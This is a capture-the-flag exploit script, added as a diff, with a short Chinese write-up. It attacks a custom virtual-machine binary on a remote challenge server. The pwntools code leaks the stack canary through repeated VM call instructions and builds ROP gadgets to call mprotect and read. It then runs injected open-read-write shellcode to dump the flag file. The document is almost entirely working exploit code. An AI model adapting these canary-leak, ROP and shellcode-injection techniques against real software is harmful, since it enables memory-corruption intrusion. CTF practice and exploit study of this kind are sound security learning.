@@ -1,0 +1,99 @@
+from pwn import *
+
+#p = process('./pwn')
+p = remote('challenge.bluesharkinfo.com', 28426)
+gdbcmd = """
+tel $rebase(0x202060) 20
+"""
+# p = gdb.debug('./pwn', gdbcmd)
+
+context(arch='amd64', os='linux', log_level='debug')
+
+def op(opcode, dest, src1, src2):
+    inst = (opcode & 0xFF) | ((dest & 0xFF) << 8) | ((src1 & 0xFF) << 16) | ((src2 & 0xFF) << 24)
+    p.sendline(str(inst))
+
+def get_gadget(index, num_1, num_2, num_3, num_4, num_5, num_6, source):
+    for i in range(num_1):
+        op(0, index, index, 3)
+    op(4, index, index, 2)
+    for i in range(num_2):
+        op(0, index, index, 3)
+    op(4, index, index, 2)
+    for i in range(num_3):
+        op(0, index, index, 3)
+    op(4, index, index, 2)
+    for i in range(num_4):
+        op(0, index, index, 3)
+    op(4, index, index, 2)
+    for i in range(num_5):
+        op(0, index, index, 3)
+    op(4, index, index, 2)
+    for i in range(num_6):
+        op(0, index, index, 3)
+    op(1, index, source, index)
+    
+op(0, 2, 2, -46)        # reg[2] 1
+op(0, 3, 3, 2)          # reg[3] 1
+for i in range(513):
+    op(7, 0, 0, 0)
+op(8, 1, 0, 0)          # reg[1] canary
+for i in range(3):
+    op(7, 1, 0, 0)
+
+for i in range(3):
+    op(0, 2, 2, 3)      # reg[2] 4
+    
+get_gadget(4, 0x1, 0xf, 0x1, 0x2, 0xb, 0xb, -4)     # reg[4] pop rdi
+get_gadget(5, 0x1, 0xe, 0xf, 0x8, 0x4, 0xf, -4)     # reg[5] pop rsi
+get_gadget(6, 0x1, 0x8, 0xb, 0x1, 0xf, 0x7, -4)     # reg[6] pop rdx rbx
+get_gadget(7, 0x0, 0xf, 0xc, 0xc, 0x0, 0x0, -4)     # reg[7] mprotect
+get_gadget(8, 0x1, 0x0, 0x6, 0xe, 0xd, 0x0, -4)     # reg[8] read
+
+op(1, 9, -11, 2)
+op(1, 9, 9, 2)                                      # reg[9] bss
+
+op(4, 10, 3, 2)
+op(4, 10, 10, 2)
+op(4, 10, 10, 2)                                    # reg[10] 0x1000
+
+for i in range(7):
+    op(0, 11, 11, 3)                                # reg[11] 0x7
+
+# mprotect(bss, 0x1000, 0x7)
+op(7, 4, 0, 0)
+op(7, 9, 0, 0)
+op(7, 5, 0, 0)
+op(7, 10, 0, 0)
+op(7, 6, 0, 0)
+op(7, 11, 0, 0)
+op(7, 11, 0, 0)
+op(7, 7, 0, 0)
+
+op(3, 10, 10, 2)                                    # reg[10] 0x1000
+op(0, 9, 10, 9)                                    # reg[10] 0x1000
+
+# read(0, bss, 0x1000)
+op(7, 4, 0, 0)
+op(7, 0, 0, 0)
+op(7, 5, 0, 0)
+op(7, 9, 0, 0)
+op(7, 6, 0, 0)
+op(7, 10, 0, 0)
+op(7, 10, 0, 0)
+op(7, 8, 0, 0)
+# ret bss
+op(7, 9, 0, 0)
+
+#gdb.attach(p, gdbcmd)
+
+p.sendline(b'9')
+
+shellcode = shellcraft.open('flag', 0)
+shellcode += shellcraft.read('rax', 'rsp', 100)
+shellcode += shellcraft.write(1, 'rsp', 100)
+p.sendline(asm(shellcode))
+
+#0x21B6A0
+p.interactive()
+我首先通过分析虚拟机的 call 指令（opcode 7）的栈操作行为，发现大量调用它可以操纵栈指针并泄露栈上的敏感数据。具体方法是先初始化两个寄存器作为累加基数，然后精确执行 513 次 call 指令，使栈增长到恰好能让随后的 load 指令（opcode 8）读到 canary 的位置，从而绕过了栈保护。随后，我编写了一个 get_gadget 函数，利用虚拟机仅有的加法、乘法等基础运算指令，像搭积木一样将寄存器中的数值通过一系列精心设计的累加和倍增步骤，逐步构造出 pop rdi、pop rsi、pop rdx rbx 等关键 ROP gadget 的地址，以及 mprotect 和 read 的 libc 函数地址。接着，我通过更多算术指令计算出 bss 段的一个可写地址和 0x1000 的权限参数，然后通过一系列 call 指令模拟函数调用链：先调用 mprotect 将 bss 段改为可读可写可执行，再调用 read 从标准输入接收我编写的 shellcode 并写入该区域，最后将控制流跳转到 bss 段。最终，我发送了一段 open-read-write 的 shellcode，成功打开 flag 文件、读取内容并输出，拿到了 flag。
